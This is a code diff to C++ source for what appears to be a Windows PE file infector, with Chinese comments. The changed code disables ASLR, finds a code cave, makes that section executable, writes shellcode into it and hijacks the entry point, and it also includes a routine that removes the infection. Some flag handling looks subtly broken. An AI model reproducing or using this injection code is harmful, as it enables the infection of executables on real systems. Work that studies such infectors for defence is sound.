@@ -4,6 +4,7 @@
 #include <fstream>
 #include <iostream>
 #include "pe.hpp"
+#include "utils.hpp"
 
 #define SMALL_SHELLCODE_LEN 1024
 
@@ -79,8 +80,8 @@ public:
 
 		CHAR* buffer = new CHAR[sizeof(InfectPadding) + 1];
 		std::memcpy(buffer, &pad, sizeof(InfectPadding));
-		file.write(buffer, sizeof(InfectPadding));
-
+		WriteBuffer(file, buffer, sizeof(InfectPadding));
+		
 		delete[] buffer;
 		file.close();
 	}
@@ -160,11 +161,22 @@ public:
 			}
 			}
 		}
+		std::ofstream file(path, std::ios::binary || std::ios::ate);
+
 		// 关闭 ASLR
 		helper.CloseASLR();
 		// 搜索代码空洞
 		CodeCave cave;
-		if (!FindCodeCave(shellcode.size() + offset, cave)) return false;
+		if (!FindCodeCave(shellcode.size() + offset, cave)) {
+			file.close();
+			return false;
+		}
+		// 读出旧的节属性
+		DWORD characteristic = helper.GetSectionHeader(cave.section_number).Characteristics;
+		characteristic |= IMAGE_SCN_MEM_EXECUTE;
+		// 修改节的属性为可执行
+		file.seekp(helper.GetSectionHeaderFOA() + cave.section_number * IMAGE_SIZEOF_SECTION_HEADER + 36, std::ios::beg);
+		WriteNextDWORD(file, characteristic);
 
 		InfectPadding pad;
 		pad.type = CODE_CAVE;
@@ -172,15 +184,13 @@ public:
 		// 保存旧的入口点
 		pad.old_entry_point = helper.GetEntryPointRVA();
 
-		std::ofstream file(path, std::ios::beg || std::ios::ate);
-
 		switch (helper.GetPEType()) {
 		case PE32: {
 			// 新的 RVA = 空洞起始RVA + offset + 4
 			helper.SetEntryPoint(cave.start_rva + offset + 4);
 			file.seekp(cave.start_foa + offset, std::ios::beg);
 			// 注入
-			file.write(shellcode.c_str(), shellcode.size());
+			WriteBuffer(file, shellcode.c_str(), shellcode.size());
 			break;
 		}
 		case PE64: {
@@ -229,7 +239,7 @@ public:
 				std::string zero_buffer(zero_buffer_len, 0x00);
 				// 注入代码清除
 				file.seekp(entry_point_foa, std::ios::beg);
-				file.write(zero_buffer.c_str(), zero_buffer_len);
+				WriteBuffer(file, zero_buffer.c_str(), zero_buffer_len);
 				// 清除感染标记
 				std::memcpy(pad.sign, "by", 2);
 
